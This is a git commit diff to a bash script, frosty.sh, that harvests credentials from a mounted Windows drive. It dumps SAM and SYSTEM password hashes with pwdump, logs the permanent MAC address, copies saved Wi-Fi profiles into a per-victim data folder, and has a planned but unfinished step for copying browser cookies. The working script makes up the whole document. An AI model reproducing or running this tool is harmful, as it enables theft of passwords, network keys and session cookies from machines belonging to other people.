1f16f74ef7c14b86988b687d5b1c33fb44a596fc
Rob <rob.facella@gmail.com>
2017-04-30 13:26:13 +0000

    Data folder created. frosty terminal output tweaked

--- frosty.sh
+++ frosty.sh
@@ -4,22 +4,35 @@ cd data
 lognumber=$(ls | wc -l)
 #mkdir if dir doesnt exist
 mkdir -p ${lognumber}
-
 cd ..
 store=${home}"/data/${lognumber}"
-
-
 hashfile="${store}/log.txt"
+
+echo "Don't forget to mount the hard drive. "
 echo "**In updated Windows versions, hashes are likely null.**"
-
-echo "##############" >> ${hashfile}
+echo " "
+echo "###Getting System Info###"
 echo "Label (arg1): ${1}" >> ${hashfile}
+echo "##############" >> ${hashfile}
 macchanger -s wlan0 | grep "Permanent" >> ${hashfile}
-
+echo "##############" >> ${hashfile}
 cd /media/root/OS/Windows/System32/config
 pwdump SYSTEM SAM >> ${hashfile}
+echo "##############" >> ${hashfile}
 cd $home
+echo "ok"
 
+echo " "
+echo "###Copying Wi-Fi Profiles###"
 cp -R /media/root/OS/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces $store"/wifi/"
+echo "ok"
 
-cat $hashfile
+echo " "
+echo "###Filling Cookie Jar###"
+echo "failed"
+
+echo " "
+echo "DONE"
+#cp -R cookie files into "${store}/cookiejar/"
+
+
